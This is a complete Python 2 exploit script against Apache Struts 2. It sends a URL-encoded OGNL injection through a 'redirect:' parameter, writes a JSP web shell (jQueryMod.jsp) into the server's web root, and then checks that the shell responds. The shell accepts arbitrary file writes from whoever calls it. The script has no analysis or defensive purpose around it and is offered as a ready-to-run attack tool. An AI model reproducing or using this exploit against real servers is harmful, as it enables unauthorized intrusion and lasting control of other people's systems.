#coding:utf-8

__author__ = 'PeiZhihong'

import sys
import requests

red = "\x1b[1;31m"
clear = "\x1b[0m"

def st2Shell(url,path):

	prefix = ".."
	newPath = "/cloudAPI/jQueryMod.jsp"

	#data = r"""redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22jQueryMod.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e"""
	data = r"""redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22"""+prefix+newPath+r"""%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e"""
	pocUrl = url + path + "?" + data
	#print pocUrl

	try: 
		res = requests.get(pocUrl,timeout=10)
		print "%sThe %s has been execute.%s" % (red,sys.argv[0],clear) 
	except Exception,e:
		print "%s%s%s" % (red,e,clear)

	try:
		shellUrl = url+newPath
		res = requests.get(shellUrl,timeout=10)
		if res.status_code == 200:
			print "%sThe shell upload successful, the url is %s%s" % (red,shellUrl,clear)
		else:
			print "%sThe shell upload fail%s" % (red,clear)
	except Exception,e:
		print "%s%s%s" % (red,e,clear)

def main():
	url = sys.argv[1]
	path = sys.argv[2]
	st2Shell(url,path)

if __name__ == '__main__':
	main()